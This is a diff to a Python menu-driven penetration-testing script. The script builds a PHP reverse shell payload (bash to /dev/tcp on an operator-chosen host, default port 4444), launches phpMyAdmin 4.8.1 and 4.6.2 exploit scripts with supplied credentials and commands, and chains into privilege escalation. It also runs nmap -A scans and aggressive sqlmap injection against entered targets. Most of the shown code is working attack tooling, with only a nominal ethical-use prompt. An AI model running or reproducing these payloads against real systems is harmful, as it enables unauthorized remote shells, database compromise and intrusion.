@@ -5,8 +5,6 @@
 #
 # python run.py
 #
-#
-#
 import os
 import sys
 from datetime import datetime
@@ -187,7 +185,8 @@ def privilege_escalation():
 # PHP Reverse Shell function
 def php_reverse_shells():
     target_ip=input("Enter Target IP address: ")
-    port=input("Enter the listening port: ")
+    port=input("Enter the listening port (leave empty for default 4444): ")
+    port=port if port else '4444'  # Use default port if none provided
     shell=f"<?php system('bash -i >& /dev/tcp/{target_ip}/{port} 0>&1'); ?>"
     
     with open("reverse_shell.php", "w") as shell_file:
@@ -225,48 +224,46 @@ def run_phpmyadmin_481_exploit():
     command=input("Enter command to execute (e.g., whoami): ")
 
     # Running the exploit with provided inputs
-    os.system(f"python phpmyadmin-4.8.1-exploit.py {ipaddr} {port} {path} {username} {password} {command}")
+    os.system(f"python phpmyadmin-4.8.1-exploit.py -t {ipaddr} -p {port} -u {username} -pw {password} -c \"{command}\"")
     privilege_escalation()
 
-
-# Function to run phpMyAdmin 4.6.2-exploit.py
+# Function to run phpMyAdmin_4.6.2_exploit.py
 def run_phpmyadmin_462_exploit():
-    ipaddr=input("Enter Target IP address: ")
-    port=input("Enter Target port (leave empty for default 3306): ")
-    port=port if port else '3306'  # Use default port if none provided
-    
-    path=input("Enter PHPMyAdmin path: ")
+    #ipaddr=input("Enter Target IP address: ")
+    #port=input("Enter Target port (leave empty for default 3306): ")
+    #port=port if port else '3306'  # Use default port if none provided
+
+    fullpath=input("Enter PHPMyAdmin full path: example http://localhost/pma ")
+    fullpath=fullpath if fullpath else 'http://localhost/pma'  # Use default port if none provided
     username=input("Enter username: ")
     password=input("Enter password: ")
     command=input("Enter command to execute (e.g., whoami): ")
 
     # Running the exploit with provided inputs
-    os.system(f"python phpMyAdmin_4.6.2_exploit.py {ipaddr} {port} {path} {username} {password} {command}")
+    os.system(f"python phpMyAdmin_4.6.2_exploit.py -u {username} -pw {password} --pwd="" {fullpath} -c \"{command}\"")
     privilege_escalation()
 
-# Install required tools function
 def install_tools():
-    tools=["nmap", "sqlmap", "hydra", "john", "nikto", "netcat"]
-    for tool in tools:
-        os.system(f"sudo apt install -y {tool}")
-    print("Tools installation complete.")
+    # This function can be expanded to install necessary tools
+    print("Installing tools...")
+    os.system("sudo apt-get update && sudo apt-get install -y nmap sqlmap hydra")
     main_menu()
 
-# Recon function using Nmap
 def recon_menu():
-    target=input("Enter Target IP address or domain: ")
-    print(f"Scanning {target} with Nmap...")
-    os.system(f"nmap -A {target}")
+    # Function for recon
+    print("Recon (Nmap Scan)")
+    target_ip=input("Enter Target IP address: ")
+    os.system(f"nmap -A {target_ip}")
     main_menu()
 
-# SQL Injection Test using sqlmap
 def sql_injection():
-    target=input("Enter Target URL (e.g., http://example.com/vulnerable.php?id=1): ")
-    print(f"Testing {target} for SQL Injection...")
-    os.system(f"sqlmap -u {target} --batch")
+    # SQL Injection using sqlmap
+    target_url=input("Enter Target URL (e.g., http://example.com/page.php?id=1): ")
+    os.system(f"sqlmap -u {target_url} --risk=3 --level=5")
     main_menu()
 
-# Entry point
-if __name__ == "__main__":
-    ethical_use_agreement()
-    main_menu()
+# Agreement to use the script ethically
+ethical_use_agreement()
+
+# Start the menu
+main_menu()
